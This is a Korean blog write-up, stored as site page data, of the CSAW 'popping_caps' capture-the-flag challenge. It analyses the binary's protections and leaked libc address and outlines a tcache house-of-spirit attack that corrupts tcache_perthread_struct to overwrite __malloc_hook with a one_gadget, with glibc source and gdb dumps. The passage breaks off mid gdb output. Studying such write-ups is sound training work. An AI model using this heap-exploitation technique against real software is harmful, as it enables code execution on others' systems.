{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/csaw_popping_ctf_writeup/",
    "result": {"data":{"cur":{"id":"1de29c36-bdf1-5fda-b1dc-8d0f43ff9540","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-분석\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\" aria-label=\"바이너리 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 분석</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ checksec \nCANARY    <span class=\"token operator\">:</span> ENABLED\nFORTIFY   <span class=\"token operator\">:</span> disabled\nNX        <span class=\"token operator\">:</span> ENABLED\nPIE       <span class=\"token operator\">:</span> ENABLED\nRELRO     <span class=\"token operator\">:</span> disabled</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>popping_caps<span class=\"token operator\">:</span> ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB shared object\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span> version <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> dynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">for</span> GNU<span class=\"token operator\">/</span>Linux <span class=\"token number\">3.2</span><span class=\"token punctuation\">.</span><span class=\"token number\">0</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0</span>b94b47318011a2516372524e7aaa0caeda06c79<span class=\"token punctuation\">,</span> <span class=\"token operator\">not</span> stripped</code></pre></div>\n<h2 id=\"바이너리-실행-결과\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%8B%A4%ED%96%89-%EA%B2%B0%EA%B3%BC\" aria-label=\"바이너리 실행 결과 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 실행 결과</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">Here is system <span class=\"token number\">0x7fb836b4c4e0</span>\nYou have <span class=\"token number\">7</span> caps<span class=\"token operator\">!</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> Malloc\n<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> Free\n<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> Write\n<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> Bye\nYour choice<span class=\"token operator\">:</span></code></pre></div>\n<ul>\n<li>lib_system 주소가 노출되는 것을 확인할 수 있으며 4개의 옵션으로 해제 , 할당, 입력, 종료가 가능하다.</li>\n</ul>\n<h2 id=\"취약한-부분\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%ED%95%9C-%EB%B6%80%EB%B6%84\" aria-label=\"취약한 부분 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약한 부분</h2>\n<h3 id=\"메모리-주소-노출\" style=\"position:relative;\"><a href=\"#%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%A3%BC%EC%86%8C-%EB%85%B8%EC%B6%9C\" aria-label=\"메모리 주소 노출 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>메모리 주소 노출</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 576px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA6klEQVQoz5WPy2rEMAxF8/9f1ykMhE7BpDN52bJlx7HsvKwSUoYuSpiKuzgLHa5UAAStybkEEJTaI+V4MGIEIMR4sNYEQMMw9f0Y48LMRdv6slQAQQjs++B9TolfnAKArld1vzuARet1nvO2cc57npDzvvobfuTHw1aV6bqxrkmpZRjYObaWY+QQdv+s2bmA6I0hot1xjr1nRD6Of5b8LVvLXZfbJoPKzk5hXIyOKa0v/SwEXy7r23v8+EziS1W1Lm+dxcgTb9N5MRfGsBCx1ooWstHJUWLEEKZV5tmuG5/pRQjcNIOSxP+fbzw6C3IMuZAhAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/aa9a11af4119581246cb38067aa789bc/533c1/0.png\"\n        srcset=\"/static/aa9a11af4119581246cb38067aa789bc/e9ff0/0.png 180w,\n/static/aa9a11af4119581246cb38067aa789bc/f21e7/0.png 360w,\n/static/aa9a11af4119581246cb38067aa789bc/533c1/0.png 576w\"\n        sizes=\"(max-width: 576px) 100vw, 576px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>lib_system 주소를 노출시키는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"main-함수-부분\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%80%EB%B6%84\" aria-label=\"main 함수 부분 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 부분</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAACCElEQVQoz32Sx67bMBBF/f/flnWKHNuRqcIidrENWyAli2c/JAezIw8JzL0Xhp2+M7fy4ENvvZZaa/mI994YY601xiiljDbOuX5y0U/Nv7Pl5/BYfhFJmNq2TVq7uxPv/bIst9vt8Xis60oI4ZwTQmqthyx4vz7ZXQ+b0bW10gpArrX9oda677s98d6nlGKMIYTW2iHzrQ+jGOiNCFFyJRgTQtZ1maeJUqq1ttb2f3CJsXBZME8h51SBMMaF4EJsnEsplVL/k5MM9C7J1wcdKB9QEoYT4pU2hClMFaaOS9AWtG25vMtZOv6NbV+Qva5xU3lTlsvuk0IrWzCbVzrNGE0Sk2r9u+z3ZIWLBpwJqeYgFKTUe28xtQg9HdNi6hF6be8yQFWmCuc8hNLbccmn7hNsyjBuN2G58EI5qRzlHfKL3BLwq6I3LEasRuKNDTH23h1m8+3BpkVgwtAczZ6lOZ5++TkVjl20kH0uESAlrfURY+29tF5qz+UYKA1yb+1121D8mXnrf4/UCUIITdM0z4SSFWPKGGXMh/Aiuz2zzXOrtd1rOUpXa40xjuM4ITTPM6VUCuGdM8Z4/7LwS92TuAo8UPyD76N0XPoQ9n2XUuoTpZTWWggRz128Nsw3xo3edYVeoGSAUkoIYRxHhNCyLE/0XJZlnmcAeJe3LccEpR0xfaR94nM9fwMR+JdrixvjrwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/be58146616ae16fc7512e936779b14b9/37523/1.png\"\n        srcset=\"/static/be58146616ae16fc7512e936779b14b9/e9ff0/1.png 180w,\n/static/be58146616ae16fc7512e936779b14b9/f21e7/1.png 360w,\n/static/be58146616ae16fc7512e936779b14b9/37523/1.png 720w,\n/static/be58146616ae16fc7512e936779b14b9/ea7fb/1.png 788w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"bye-함수-부분\" style=\"position:relative;\"><a href=\"#bye-%ED%95%A8%EC%88%98-%EB%B6%80%EB%B6%84\" aria-label=\"bye 함수 부분 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bye 함수 부분</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 641px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvklEQVQY043OwW7CMAyA4b7/e23HHXaZdkFsUts4Ibbj2kmhNEXtGEJc4D9a/mQ30L0XNmHMLDaU4/FcSjWrtdblWc3PR/l6i/vP3eG7C7+u673q2azO8wsY9ZTHef6/IyLTNC2v1ZRpZX9PqmrbthEjESEiETExE4sIM5vZbfOK86ku9TpKKa04Rudc3/eI2G4h4TiOIvKI7y+LiNuKGMFD8AEAEDFJyjkPw/AEA8Bhy3sfQlhlSqpKRKr6gC/kt5VUED2jSQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/0307905eb1aa7e424b948b07f94c2d3f/c7dcc/2.png\"\n        srcset=\"/static/0307905eb1aa7e424b948b07f94c2d3f/e9ff0/2.png 180w,\n/static/0307905eb1aa7e424b948b07f94c2d3f/f21e7/2.png 360w,\n/static/0307905eb1aa7e424b948b07f94c2d3f/c7dcc/2.png 641w\"\n        sizes=\"(max-width: 641px) 100vw, 641px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"exploit-idea\" style=\"position:relative;\"><a href=\"#exploit-idea\" aria-label=\"exploit idea permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Idea</h2>\n<ul>\n<li>라이브러리 주소가 노출이되어 있기 때문에 해당 바이너리가 7가지 작업 만 수행 할 수 있으므로 작업을 낭비할 필요가 없다.</li>\n<li>라이브러리 버전은 2.27 버전이며 tcache를 사용하고 있다.</li>\n<li>바이너리 분석 결과 UAF를 직접적으로 가능하지 않기 때문에 tcache poisoning이 불가능 하다.</li>\n<li>우리는 Double free buf를 바탕으로 tcache dup을 사용할 수 있다.</li>\n<li>힙의 어느 위치에서나 해제가 가능하므로 tcache house of spirit을 사용할 수 있다.</li>\n<li>security check로 인해 작성하려는 위치에 fake chunk을 만들어야 한다.</li>\n<li>house of spirit을 사용하여 <code class=\"language-text\">tcache_perthread_structs</code> 항목을 손상시키는 것이 방법이다.</li>\n</ul>\n<h2 id=\"exploit-scenario\" style=\"position:relative;\"><a href=\"#exploit-scenario\" aria-label=\"exploit scenario permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Scenario</h2>\n<ol>\n<li>0x3a8 사이즈 동적 할당</li>\n<li>tcahcebin (0x100) → 0x3a8 사이즈의 힙 해제후 tcache count 증가 로 인해 0x100 크기의 fake chunk의 size를 생성</li>\n<li>-0x210 (House of Spirit)의 Integer issue를 사용하여 fake chunk를 해제한다.</li>\n<li>크기가 0xf8인 malloc은 첫 번째 tcache 항목 (size 0x20)에 포인터를 반환한다.</li>\n<li>__malloc_hook의 포인터로 첫 번째 항목을 편집한다.</li>\n<li>size 0x20인 malloc 에서 반환된 포인터는 __malloc_hook이 된다.</li>\n<li>one_gadget으로 __malloc_hook에 overwrite 한다.</li>\n</ol>\n<h2 id=\"tcache_perthread_struct\" style=\"position:relative;\"><a href=\"#tcache_perthread_struct\" aria-label=\"tcache_perthread_struct permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>tcache_perthread_struct</h2>\n<ul>\n<li><code class=\"language-text\">_int_malloc</code> 을 통해 <code class=\"language-text\">tcache_perthread_struct</code>가 할당되어 힙에 상주한다.</li>\n<li>counts 멤버를 손상 시킨다면 tcache poisoning이 수행하는 작업을 더 적은 단계로 수 행 할 수 있다.</li>\n<li><code class=\"language-text\">tcache_perthread_struct</code> 는 single tcache thread의 body이며 두 개의 배열로 구성된다.</li>\n<li>그 중에서 데이터 항목은 <code class=\"language-text\">tcache entries</code>, <code class=\"language-text\">TCACHE_MAX_BIN 총 개수(default 64개)</code> , <code class=\"language-text\">tcache counts</code> 배열은 각 single linked list의 메모리 블록 수를 나타낸다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_perthread_struct</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">char</span> counts<span class=\"token punctuation\">[</span>TCACHE_MAX_BINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  tcache_entry <span class=\"token operator\">*</span>entries<span class=\"token punctuation\">[</span>TCACHE_MAX_BINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> tcache_perthread_struct<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>struct의 single linked list의 최대 개수는 64개이며 single linked list에는 최대 7개의 메모리 블록이 있다.</li>\n<li>수용할 수 있는 최대 메모리 블록 크기는 0x408($1032_(10)$) 이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">USE_TCACHE</span></span>\n<span class=\"token comment\">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TCACHE_MAX_BINS</span>\t\t<span class=\"token expression\"><span class=\"token number\">64</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MAX_TCACHE_SIZE</span>\t<span class=\"token expression\"><span class=\"token function\">tidx2usize</span> <span class=\"token punctuation\">(</span>TCACHE_MAX_BINS<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token comment\">/* Only used to pre-fill the tunables.  */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">tidx2usize</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span>\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span> idx<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> MALLOC_ALIGNMENT <span class=\"token operator\">+</span> MINSIZE <span class=\"token operator\">-</span> SIZE_SZ<span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token comment\">/* When \"x\" is from chunksize().  */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">csize2tidx</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> MINSIZE <span class=\"token operator\">+</span> MALLOC_ALIGNMENT <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> MALLOC_ALIGNMENT<span class=\"token punctuation\">)</span></span></span>\n<span class=\"token comment\">/* When \"x\" is a user-provided size.  */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">usize2tidx</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token function\">csize2tidx</span> <span class=\"token punctuation\">(</span><span class=\"token function\">request2size</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token comment\">/* With rounding and alignment, the bins are...\n   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)\n   idx 1   bytes 25..40 or 13..20\n   idx 2   bytes 41..56 or 21..28\n   etc.  */</span>\n\n<span class=\"token comment\">/* This is another arbitrary limit, which tunables can change.  Each\n   tcache bin will hold at most this number of chunks.  */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TCACHE_FILL_COUNT</span> <span class=\"token expression\"><span class=\"token number\">7</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></code></pre></div>\n<h2 id=\"heap-순서-파악\" style=\"position:relative;\"><a href=\"#heap-%EC%88%9C%EC%84%9C-%ED%8C%8C%EC%95%85\" aria-label=\"heap 순서 파악 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>heap 순서 파악</h2>\n<ul>\n<li>tcache_perthread_struct를 조작하기 위해서는 힙 순서를 파악해야 한다.</li>\n<li>힙은 첫 번째 할당에서만 시작되므로 할당하고 분석</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAZ0lEQVQY05XOyw2AIBREUSpBiQiIfATEpw8xMbH/mlzYACazPZlLHkxXgYBVBzt7QQfV8dYRUw6NyNImFh+zkEa1ewL76Y6b6rVTjk+SiT/PEMEHtNtqkqWD/JcNLlaoesn9OLWzD7+qIC2APT6DdQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/9b074550c9f4bafc691c35d4ba361b50/37523/3.png\"\n        srcset=\"/static/9b074550c9f4bafc691c35d4ba361b50/e9ff0/3.png 180w,\n/static/9b074550c9f4bafc691c35d4ba361b50/f21e7/3.png 360w,\n/static/9b074550c9f4bafc691c35d4ba361b50/37523/3.png 720w,\n/static/9b074550c9f4bafc691c35d4ba361b50/bf433/3.png 971w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>첫 번째 힙은 항상 tcache_perthread_struct 이다.</li>\n<li>두 번째 힙 청크는 0x3a8 크기</li>\n<li>마지막은 탑 청크로 분석된다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ p <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_perthread_struct</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x5577632b8000</span>\n$<span class=\"token number\">1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  counts <span class=\"token operator\">=</span> <span class=\"token string\">\"\\000\\000\\000\\000\\000\\000\\000\\000Q\\002\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">53</span> times<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  entries <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">57</span> times<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5577632b8260</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><span class=\"token 